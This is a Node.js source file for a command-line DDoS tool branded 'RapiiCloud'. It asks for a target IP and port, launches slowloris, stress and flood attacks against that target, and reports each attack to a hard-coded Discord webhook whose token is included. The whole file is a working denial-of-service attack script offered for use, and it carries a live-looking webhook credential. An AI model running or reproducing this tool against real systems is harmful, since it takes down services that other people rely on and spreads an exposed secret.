const os = require("os");
const Loris = require("@anzerr/slowloris.tool");
const { Webhook } = require('discord-webhook-node');
const Stress = require("ddos-stress");
const stress = new Stress ();
const stress1 = new Stress ();

var setTitle = require('console-title');
setTitle('RapiiCloud');
const prompt = require("prompt-sync")();
console.log(`╔════════════════════════════════════════════╗`.blue);
console.log(`║                RapiiCloud DDoS               ║`.blue);
console.log(`╚════════════════════════════════════════════╝`.blue);
console.log(`╔══[Input IP]`.blue);
var IP = prompt(`╚════> `.blue);
console.log(`╔══[Input PORT]`.blue);
var PORT = prompt(`╚════> `.blue);
const hook = new Webhook("https://discord.com/api/webhooks/1004565435842310174/QJ0pB-dlZAXNrY9GnKaSOajciW6pM5mHeAlzuTLI-EkQyIyP7GUdJWgi1ikwalJsuyO-");
hook.send("** :rocket: [ Logs ] Sending attack to " + IP +":"+ PORT +"**");
var Kira = require('kira');
var api = new Kira();
var api1 = new Kira();

stress.run(''+ IP +':'+ PORT +'', 7000)
let l = new Loris('http://'+ IP +':'+ PORT +'', 7000).attack();
api.kill('http://'+ IP +'', 700, 20000, 'https://'+ IP +':'+ PORT +'');

return new Promise((resolve) => l.once("end", resolve))
  .then(() => {
    console.log("attack stopped");
  })
  .catch(console.log);


